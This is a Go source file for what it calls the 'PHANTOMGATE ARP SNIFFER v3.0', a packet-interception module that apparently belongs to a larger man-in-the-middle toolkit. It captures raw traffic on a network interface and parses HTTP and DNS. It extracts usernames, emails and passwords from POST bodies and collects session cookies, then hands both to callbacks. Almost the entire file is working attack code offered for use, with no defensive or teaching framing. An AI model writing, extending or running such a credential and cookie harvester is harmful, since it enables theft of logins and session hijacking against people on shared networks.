package arp

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ══════════════════════════════════════════════════════════════════════════════
// PHANTOMGATE ARP SNIFFER v3.0 — PASSIVE TRAFFIC INTERCEPTION
// ══════════════════════════════════════════════════════════════════════════════

type ARPSniffer struct {
	iface       *net.Interface
	fd          int
	running     bool
	stopChan    chan struct{}
	
	// Traffic capture
	packets     []*CapturedPacket
	packetsMu   sync.RWMutex
	maxPackets  int
	
	// Protocol parsers
	httpParser  *HTTPParser
	dnsParser   *DNSParser
	tcpParser   *TCPSessionTracker
	
	// Statistics
	stats       *SnifferStats
	
	// Callbacks
	onCredential func(*ARPAdvancedCredential)
	onSession   func(*ARPAdvancedSession)
	onDNSQuery  func(string, net.IP)
}

type CapturedPacket struct {
	Timestamp   time.Time
	SrcIP       net.IP
	DstIP       net.IP
	SrcMAC      net.HardwareAddr
	DstMAC      net.HardwareAddr
	Protocol    string
	Length      int
	Payload     []byte
	Parsed      *ParsedPacket
}

type ParsedPacket struct {
	HTTP        *HTTPRequest
	DNS         *DNSQuery
	TCP         *TCPInfo
	UDP         *UDPInfo
}

type HTTPRequest struct {
	Method    string
	Host      string
	Path      string
	Headers   map[string]string
	Cookies   map[string]string
	Body      []byte
	IsHTTPS   bool
}

type DNSQuery struct {
	Name   string
	Type   uint16
	Class  uint16
}

type TCPInfo struct {
	SrcPort  uint16
	DstPort  uint16
	SeqNum   uint32
	AckNum   uint32
	Flags    uint8
}

type UDPInfo struct {
	SrcPort uint16
	DstPort uint16
}

type SnifferStats struct {
	PacketsCaptured int64
	BytesCaptured   int64
	HTTPRequests    int64
	DNSQueries      int64
	TCPSessions     int64
	Credentials     int64
	Sessions        int64
}

type HTTPParser struct{}

type DNSParser struct{}

type TCPSessionTracker struct {
	sessions map[string]*TCPSession
	mu       sync.RWMutex
}

type TCPSession struct {
	SrcIP    net.IP
	DstIP    net.IP
	SrcPort  uint16
	DstPort  uint16
	Streams  []*TCPStream
}

type TCPStream struct {
	Direction string
	Payload   []byte
	Complete  bool
}

func NewARPSniffer(iface string) (*ARPSniffer, error) {
	netIface, err := net.InterfaceByName(iface)
	if err != nil {
		return nil, fmt.Errorf("interface '%s' not found: %w", iface, err)
	}

	s := &ARPSniffer{
		iface:      netIface,
		fd:         -1,
		stopChan:   make(chan struct{}),
		maxPackets: 10000,
		packets:    make([]*CapturedPacket, 0),
		httpParser: &HTTPParser{},
		dnsParser:  &DNSParser{},
		tcpParser: &TCPSessionTracker{
			sessions: make(map[string]*TCPSession),
		},
		stats: &SnifferStats{},
	}

	return s, nil
}

func (s *ARPSniffer) Start() error {
	var err error
	s.fd, err = syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0003))) // ETH_P_ALL
	if err != nil {
		return fmt.Errorf("failed to open raw socket (requires root): %w", err)
	}

	sa := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_IP),
		Ifindex:  s.iface.Index,
	}
	if err := syscall.Bind(s.fd, &sa); err != nil {
		syscall.Close(s.fd)
		return fmt.Errorf("failed to bind raw socket: %w", err)
	}

	s.running = true
	log.Printf("[ARP SNIFFER] Started on interface %s", s.iface.Name)

	go s.captureLoop()
	go s.statsLoop()

	return nil
}

func (s *ARPSniffer) Stop() {
	s.running = false
	close(s.stopChan)
	if s.fd >= 0 {
		syscall.Close(s.fd)
		s.fd = -1
	}
	log.Printf("[ARP SNIFFER] Stopped: %d packets captured", atomic.LoadInt64(&s.stats.PacketsCaptured))
}

func (s *ARPSniffer) captureLoop() {
	buf := make([]byte, 65535)

	for s.running {
		n, _, err := syscall.Recvfrom(s.fd, buf, 0)
		if err != nil {
			if s.running {
				continue
			}
			return
		}

		atomic.AddInt64(&s.stats.PacketsCaptured, 1)
		atomic.AddInt64(&s.stats.BytesCaptured, int64(n))

		if n < 14 {
			continue
		}

		packet := make([]byte, n)
		copy(packet, buf[:n])

		go s.processPacket(packet)
	}
}

func (s *ARPSniffer) processPacket(packet []byte) {
	if len(packet) < 14 {
		return
	}

	ethType := binary.BigEndian.Uint16(packet[12:14])
	if ethType != 0x0800 { // Not IPv4
		return
	}

	if len(packet) < 34 {
		return
	}

	ipHeader := packet[14:]
	srcIP := net.IP(ipHeader[12:16]).To4()
	dstIP := net.IP(ipHeader[16:20]).To4()
	protocol := ipHeader[9]

	captured := &CapturedPacket{
		Timestamp: time.Now(),
		SrcIP:     srcIP,
		DstIP:     dstIP,
		SrcMAC:    net.HardwareAddr(packet[6:12]),
		DstMAC:    net.HardwareAddr(packet[0:6]),
		Length:    len(packet),
		Payload:   packet,
		Parsed:    &ParsedPacket{},
	}

	switch protocol {
	case 6: // TCP
		s.processTCP(packet, captured)
	case 17: // UDP
		s.processUDP(packet, captured)
	}

	s.storePacket(captured)
}

func (s *ARPSniffer) processTCP(packet []byte, captured *CapturedPacket) {
	if len(packet) < 34 {
		return
	}

	ipHeader := packet[14:]
	ipHeaderLen := int(ipHeader[0]&0x0f) * 4
	tcpHeader := packet[14+ipHeaderLen:]

	if len(tcpHeader) < 20 {
		return
	}

	srcPort := binary.BigEndian.Uint16(tcpHeader[0:2])
	dstPort := binary.BigEndian.Uint16(tcpHeader[2:4])
	seqNum := binary.BigEndian.Uint32(tcpHeader[4:8])
	ackNum := binary.BigEndian.Uint32(tcpHeader[8:12])
	flags := tcpHeader[13]

	captured.Protocol = "TCP"
	captured.Parsed.TCP = &TCPInfo{
		SrcPort: srcPort,
		DstPort: dstPort,
		SeqNum:  seqNum,
		AckNum:  ackNum,
		Flags:   flags,
	}

	// HTTP traffic
	if srcPort == 80 || dstPort == 80 || srcPort == 443 || dstPort == 443 {
		tcpHeaderLen := int(tcpHeader[12]>>4) * 4
		payload := tcpHeader[tcpHeaderLen:]
		if len(payload) > 0 {
			s.processHTTPPayload(captured, payload)
		}
	}

	// Track TCP sessions
	s.trackTCPSession(captured)
}

func (s *ARPSniffer) processUDP(packet []byte, captured *CapturedPacket) {
	if len(packet) < 42 {
		return
	}

	ipHeader := packet[14:]
	ipHeaderLen := int(ipHeader[0]&0x0f) * 4
	udpHeader := packet[14+ipHeaderLen:]

	if len(udpHeader) < 8 {
		return
	}

	srcPort := binary.BigEndian.Uint16(udpHeader[0:2])
	dstPort := binary.BigEndian.Uint16(udpHeader[2:4])

	captured.Protocol = "UDP"
	captured.Parsed.UDP = &UDPInfo{
		SrcPort: srcPort,
		DstPort: dstPort,
	}

	// DNS traffic
	if srcPort == 53 || dstPort == 53 {
		dnsPayload := udpHeader[8:]
		s.processDNSPayload(captured, dnsPayload)
	}
}

func (s *ARPSniffer) processHTTPPayload(captured *CapturedPacket, payload []byte) {
	httpReq := s.httpParser.Parse(payload)
	if httpReq == nil {
		return
	}

	captured.Parsed.HTTP = httpReq
	atomic.AddInt64(&s.stats.HTTPRequests, 1)

	// Check for credentials
	if s.onCredential != nil && httpReq.Method == "POST" {
		cred := s.extractCredentials(httpReq)
		if cred != nil {
			cred.SourceIP = captured.SrcIP.String()
			cred.Timestamp = captured.Timestamp
			s.onCredential(cred)
			atomic.AddInt64(&s.stats.Credentials, 1)
		}
	}

	// Check for session cookies
	if len(httpReq.Cookies) > 0 {
		session := &ARPAdvancedSession{
			Cookies:   httpReq.Cookies,
			Service:   httpReq.Host,
			Timestamp: captured.Timestamp,
			IsValid:   true,
		}
		if s.onSession != nil {
			s.onSession(session)
		}
		atomic.AddInt64(&s.stats.Sessions, 1)
	}
}

func (s *ARPSniffer) processDNSPayload(captured *CapturedPacket, payload []byte) {
	if len(payload) < 12 {
		return
	}

	qdCount := binary.BigEndian.Uint16(payload[4:6])
	if qdCount == 0 {
		return
	}

	queryName, _ := parseDNSName(payload, 12)
	if queryName == "" {
		return
	}

	queryType := binary.BigEndian.Uint16(payload[12+len(queryName)+1 : 12+len(queryName)+3])

	dnsQuery := &DNSQuery{
		Name:  queryName,
		Type:  queryType,
		Class: 1,
	}

	captured.Parsed.DNS = dnsQuery
	atomic.AddInt64(&s.stats.DNSQueries, 1)

	if s.onDNSQuery != nil {
		s.onDNSQuery(queryName, captured.SrcIP)
	}
}

func (s *ARPSniffer) extractCredentials(req *HTTPRequest) *ARPAdvancedCredential {
	if req.Method != "POST" {
		return nil
	}

	cred := &ARPAdvancedCredential{
		Service: req.Host,
	}

	body := string(req.Body)
	if strings.Contains(body, "username") || strings.Contains(body, "email") {
		cred.Username = extractField(body, "username")
		if cred.Username == "" {
			cred.Username = extractField(body, "email")
		}
	}

	if strings.Contains(body, "password") {
		cred.Password = extractField(body, "password")
	}

	if cred.Username != "" || cred.Password != "" {
		return cred
	}

	return nil
}

func extractField(body, field string) string {
	idx := strings.Index(body, field)
	if idx == -1 {
		return ""
	}

	// Look for = or : after field name
	for i := idx + len(field); i < len(body); i++ {
		if body[i] == '=' || body[i] == ':' {
			// Skip whitespace
			i++
			for i < len(body) && body[i] == ' ' {
				i++
			}
			// Read value until & or end
			start := i
			for i < len(body) && body[i] != '&' && body[i] != ';' {
				i++
			}
			return body[start:i]
		}
	}

	return ""
}

func (s *ARPSniffer) trackTCPSession(captured *CapturedPacket) {
	if captured.Parsed.TCP == nil {
		return
	}

	tcp := captured.Parsed.TCP
	key := fmt.Sprintf("%s:%d-%s:%d", captured.SrcIP, tcp.SrcPort, captured.DstIP, tcp.DstPort)

	s.tcpParser.mu.Lock()
	session, exists := s.tcpParser.sessions[key]
	if !exists {
		session = &TCPSession{
			SrcIP:   captured.SrcIP,
			DstIP:   captured.DstIP,
			SrcPort: tcp.SrcPort,
			DstPort: tcp.DstPort,
		}
		s.tcpParser.sessions[key] = session
		atomic.AddInt64(&s.stats.TCPSessions, 1)
	}

	session.Streams = append(session.Streams, &TCPStream{
		Direction: "request",
		Payload:   captured.Payload,
		Complete:  (tcp.Flags & 0x01) != 0, // FIN
	})
	s.tcpParser.mu.Unlock()
}

func (s *ARPSniffer) storePacket(captured *CapturedPacket) {
	s.packetsMu.Lock()
	defer s.packetsMu.Unlock()

	s.packets = append(s.packets, captured)
	if len(s.packets) > s.maxPackets {
		s.packets = s.packets[1:]
	}
}

func (s *ARPSniffer) GetPackets(limit int) []*CapturedPacket {
	s.packetsMu.RLock()
	defer s.packetsMu.RUnlock()

	if limit > len(s.packets) {
		limit = len(s.packets)
	}

	result := make([]*CapturedPacket, limit)
	copy(result, s.packets[len(s.packets)-limit:])
	return result
}

func (s *ARPSniffer) GetHTTPRequests() []*HTTPRequest {
	s.packetsMu.RLock()
	defer s.packetsMu.RUnlock()

	var requests []*HTTPRequest
	for _, pkt := range s.packets {
		if pkt.Parsed != nil && pkt.Parsed.HTTP != nil {
			requests = append(requests, pkt.Parsed.HTTP)
		}
	}
	return requests
}

func (s *ARPSniffer) GetDNSQueries() []*DNSQuery {
	s.packetsMu.RLock()
	defer s.packetsMu.RUnlock()

	var queries []*DNSQuery
	for _, pkt := range s.packets {
		if pkt.Parsed != nil && pkt.Parsed.DNS != nil {
			queries = append(queries, pkt.Parsed.DNS)
		}
	}
	return queries
}

func (s *ARPSniffer) statsLoop() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopChan:
			return
		case <-ticker.C:
			log.Printf("[ARP SNIFFER] Packets: %d | HTTP: %d | DNS: %d | Sessions: %d",
				atomic.LoadInt64(&s.stats.PacketsCaptured),
				atomic.LoadInt64(&s.stats.HTTPRequests),
				atomic.LoadInt64(&s.stats.DNSQueries),
				atomic.LoadInt64(&s.stats.TCPSessions))
		}
	}
}

// Parse is a stub for HTTP parsing
func (p *HTTPParser) Parse(payload []byte) *HTTPRequest {
	if len(payload) < 10 {
		return nil
	}

	payloadStr := string(payload)
	if !strings.HasPrefix(payloadStr, "GET ") &&
		!strings.HasPrefix(payloadStr, "POST ") &&
		!strings.HasPrefix(payloadStr, "PUT ") &&
		!strings.HasPrefix(payloadStr, "DELETE ") &&
		!strings.HasPrefix(payloadStr, "HEAD ") &&
		!strings.HasPrefix(payloadStr, "OPTIONS ") {
		return nil
	}

	lines := strings.Split(payloadStr, "\r\n")
	if len(lines) < 1 {
		return nil
	}

	parts := strings.SplitN(lines[0], " ", 3)
	if len(parts) < 2 {
		return nil
	}

	req := &HTTPRequest{
		Method:  parts[0],
		Path:    parts[1],
		Headers: make(map[string]string),
		Cookies: make(map[string]string),
	}

	// Parse headers
	for i := 1; i < len(lines); i++ {
		line := lines[i]
		if line == "" {
			// Body follows
			if i+1 < len(lines) {
				req.Body = []byte(strings.Join(lines[i+1:], "\r\n"))
			}
			break
		}

		if strings.HasPrefix(line, "Host:") {
			req.Host = strings.TrimPrefix(line, "Host: ")
		} else if strings.HasPrefix(line, "Cookie:") {
			cookies := strings.TrimPrefix(line, "Cookie: ")
			for _, cookie := range strings.Split(cookies, ";") {
				parts := strings.SplitN(strings.TrimSpace(cookie), "=", 2)
				if len(parts) == 2 {
					req.Cookies[parts[0]] = parts[1]
				}
			}
		} else if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			req.Headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}

	return req
}
